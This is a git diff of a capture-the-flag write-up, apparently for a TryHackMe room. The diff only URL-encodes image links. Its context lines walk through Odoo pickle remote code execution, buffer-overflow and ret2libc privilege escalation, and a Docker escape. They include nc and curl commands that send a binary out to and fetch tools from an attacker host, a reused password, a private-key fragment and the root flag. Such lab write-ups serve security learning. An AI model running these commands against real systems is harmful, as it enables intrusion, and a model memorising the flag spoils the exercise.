@@ -25,7 +25,7 @@ sticker: emoji//26ab
 
 Ftp Anonymous login is enabled, let's check it out:
 
-![](Pasted image 20250328163655.png)
+![](Pasted%20image%2020250328163655.png)
 
 Let's check both files:
 
@@ -159,11 +159,11 @@ remember this next time 'SecurePassword123!'
 
 Let's save that for now, we can proceed to the web application.
 
-![](Pasted image 20250328165621.png)
+![](Pasted%20image%2020250328165621.png)
 
 It's a login page but we can find something interesting in here, a `manage databases` section, if we go into it we can find this:
 
-![](Pasted image 20250328165709.png)
+![](Pasted%20image%2020250328165709.png)
 
 We can create a backup of the `main` database, let's use the password we got from earlier, it gives us a zip file, when we unzip it, we get a `filestore` and `dump.sql` file, with this, we can check on some basic stuff, for example, let's check the tables:
 
@@ -179,7 +179,7 @@ public.res_users
 
 If we try visualizing the contents, we can find the `admin@antisoft.thm` user:
 
-![](Pasted image 20250328171455.png)
+![](Pasted%20image%2020250328171455.png)
 
 Let's try using the password we got before, if we're lucky, we can access the panel:
 
@@ -189,7 +189,7 @@ admin@antisoft.thm:SecurePassword123!
 ```
 
 
-![](Pasted image 20250328171629.png)
+![](Pasted%20image%2020250328171629.png)
 
 There we go, let's start exploitation phase.
 
@@ -199,13 +199,13 @@ There we go, let's start exploitation phase.
 
 We are inside `odoo`, **Odoo** is a popular **open-source Enterprise Resource Planning (ERP) software** used by businesses to manage operations like sales, accounting, inventory, HR, and more, let's look at the version:
 
-![](Pasted image 20250328171739.png)
+![](Pasted%20image%2020250328171739.png)
 
 
 
 Let's search for an exploit:
 
-![](Pasted image 20250328171812.png)
+![](Pasted%20image%2020250328171812.png)
 
 We got a code execution vulnerability regarding Odoo 10
 
@@ -260,7 +260,7 @@ Remove the "Apps" filter and search for Database Anonymization.
 Install the module
 ```
 
-![](Pasted image 20250328172649.png)
+![](Pasted%20image%2020250328172649.png)
 
 
 Now:
@@ -274,11 +274,11 @@ Set up listener
 Upload exploit.pickle and confirm.
 ```
 
-![](Pasted image 20250328173631.png)
+![](Pasted%20image%2020250328173631.png)
 
 If we check our listener:
 
-![](Pasted image 20250328173643.png)
+![](Pasted%20image%2020250328173643.png)
 
 We got our shell, let's proceed with privilege escalation.
 
@@ -299,22 +299,22 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](Pasted image 20250328173800.png)
+![](Pasted%20image%2020250328173800.png)
 
 Now we're good to start, we can check this:
 
-![](Pasted image 20250328174443.png)
+![](Pasted%20image%2020250328174443.png)
 
 We got a `/ret` binary, let's run it:
 
 
-![](Pasted image 20250328174509.png)
+![](Pasted%20image%2020250328174509.png)
 
 Weird, it could mean we are inside of a docker container:
 
-![](Pasted image 20250328174532.png)
+![](Pasted%20image%2020250328174532.png)
 
-![](Pasted image 20250328174544.png)
+![](Pasted%20image%2020250328174544.png)
 
 We are inside of a docker container, let's analyze the binary in our local machine, since `python3` is not enabled in the container we need to go with `nc`:
 
@@ -325,15 +325,15 @@ nc -w 3 RECEIVER_IP PORT < ret # On our shell
 
 We can go with `ghidra` to analyze the binary:
 
-![](Pasted image 20250328175340.png)
+![](Pasted%20image%2020250328175340.png)
 
 We can see the following, there's a `vuln()` function which goes with this:
 
-![](Pasted image 20250328175458.png)
+![](Pasted%20image%2020250328175458.png)
 
 The vuln function uses `gets()`, we can find another function called `win`:
 
-![](Pasted image 20250328175558.png)
+![](Pasted%20image%2020250328175558.png)
 
 We are dealing with something called `ret2win`, let's search how to exploit this:
 
@@ -377,7 +377,7 @@ We can now do this:
 
 If we do this:
 
-![](Pasted image 20250328181735.png)
+![](Pasted%20image%2020250328181735.png)
 
 We got root on the docker container, we need some way to break out of it, let's use a `nmap` binary to scan the network:
 
@@ -389,7 +389,7 @@ curl http://10.6.34.159:8000/nmap -o /tmp/nmap
 ./tmp/nmap -sT -p- 172.17.0.1
 ```
 
-![](Pasted image 20250328182044.png)
+![](Pasted%20image%2020250328182044.png)
 
 Something is running on port `4444`, let's use `nc` to look at it:
 
@@ -397,7 +397,7 @@ Something is running on port `4444`, let's use `nc` to look at it:
 nc 172.17.0.1 4444
 ```
 
-![](Pasted image 20250328182132.png)
+![](Pasted%20image%2020250328182132.png)
 
 It runs the same as `ret` binary, we can exploit it in the same way then:
 
@@ -405,12 +405,12 @@ It runs the same as `ret` binary, we can exploit it in the same way then:
 (cat /tmp/payload.p; cat) | nc 172.17.0.1 4444
 ```
 
-![](Pasted image 20250328182223.png)
+![](Pasted%20image%2020250328182223.png)
 
 We got a shell as `zeeshan`, let's try reading his home folder to check if there's a private key for ssh:
 
 
-![](Pasted image 20250328182321.png)
+![](Pasted%20image%2020250328182321.png)
 
 There we go, let's get it:
 
@@ -446,7 +446,7 @@ c7FgDFMEoa44S7BZIhxymHyGN7xgPQ6EJonUuMCfmP83KLRZrkI4FPI=
 
 We can now go into ssh:
 
-![](Pasted image 20250328182433.png)
+![](Pasted%20image%2020250328182433.png)
 
 We finally got out of the docker container, with this, let's figure out how to get into root:
 
@@ -463,7 +463,7 @@ User zeeshan may run the following commands on hydra:
 
 We got a `/exploit_me` file, let's check it:
 
-![](Pasted image 20250328182732.png)
+![](Pasted%20image%2020250328182732.png)
 
 Let's download the file in our local machine and analyze it:
 
@@ -539,11 +539,11 @@ Gets address: 0x7f2227e81d90
 Setuid address: 0x7f2227ee0330
 ```
 
-![](Pasted image 20250328185828.png)
+![](Pasted%20image%2020250328185828.png)
 
 Now, with each address, we can calculate the offset to the base address using libc:
 
-![](Pasted image 20250328185935.png)
+![](Pasted%20image%2020250328185935.png)
 
 Let's download the second file, the first file didn't work for me and simply do the following payload to get root:
 
@@ -612,7 +612,7 @@ p.interactive()
 We get the following:
 
 
-![](Pasted image 20250328191503.png)
+![](Pasted%20image%2020250328191503.png)
 
 There we go, we can add `zeeshan` to `sudoers` to move easily using ssh:
 
@@ -626,7 +626,7 @@ And then:
 sudo su
 ```
 
-![](Pasted image 20250328191705.png)
+![](Pasted%20image%2020250328191705.png)
 ```
 find / -type f \( -path /proc -o -path /sys -o -path /dev \) -prune -o -name "*.txt" -exec grep -H 'THM{\{' {} \; 2>/dev/null
 ```
@@ -647,5 +647,5 @@ root@hydra:/home/zeeshan# cat /root/root.txt
 THM{8bbc6221d009576d37e28acdd9da7aba}
 ```
 
-![](Pasted image 20250328192438.png)
+![](Pasted%20image%2020250328192438.png)
 
